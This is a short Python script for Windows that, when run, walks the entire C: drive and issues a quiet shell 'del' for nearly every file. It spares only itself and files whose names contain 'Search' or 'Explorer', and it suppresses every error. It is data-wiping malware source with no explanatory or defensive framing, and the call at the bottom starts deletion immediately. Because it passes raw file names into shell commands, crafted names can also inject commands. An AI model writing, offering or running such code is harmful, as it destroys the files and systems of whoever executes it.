import os
import sys
def del_all():
    filename=os.path.basename(sys.argv[0])
    locate=os.environ["APPDATA"]
    for a,b,c in os.walk("C:/"):
        try:
            os.chdir(a)
        except:
            pass
        for i in c:
            if i==str(filename) or "Search" in i or "search" in i or "Explorer" in i:
                pass
            else:
                try:
                    os.chdir(a)
                    command="del %s /Q"%i
                    os.system(command)
                except:
                    pass

del_all()